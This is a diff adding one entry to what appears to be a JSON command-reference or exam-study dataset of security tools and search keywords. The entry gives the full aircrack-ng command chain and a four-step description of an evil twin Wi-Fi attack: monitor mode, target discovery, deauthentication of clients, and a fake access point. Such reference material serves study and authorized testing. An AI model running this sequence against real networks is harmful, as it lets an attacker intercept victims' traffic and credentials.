@@ -4567,5 +4567,22 @@
       "create packet for wep attack",
       "craft injection packet"
     ]
+  },
+  {
+    "tool": "aircrack-ng suite",
+    "command": "airmon-ng start <interface> -> airodump-ng <interface> (find target bssid, channel, essid) -> aireplay-ng --deauth <count> -a <bssid> <interface> -> airbase-ng -e <ssid-name> -c <channel> <interface>",
+    "desc": "DISCLAIMER - lab / authorized testing only, tool owner not responsible for misuse. evil twin attack, 4 steps - (1) enable monitor mode (2) find the target network's bssid/channel/essid (3) deauth clients off the real ap so they look for a network to reconnect to (4) stand up a fake ap using the same essid so victims connect to it instead",
+    "keywords": [
+      "evil twin attack process",
+      "evil twin attack steps",
+      "evil twin attack full command",
+      "fake access point attack steps",
+      "rogue ap attack process",
+      "walk through evil twin attack",
+      "evil twin attack explained",
+      "how does evil twin attack work",
+      "evil twin 4 steps",
+      "exam question evil twin"
+    ]
   }
 ]
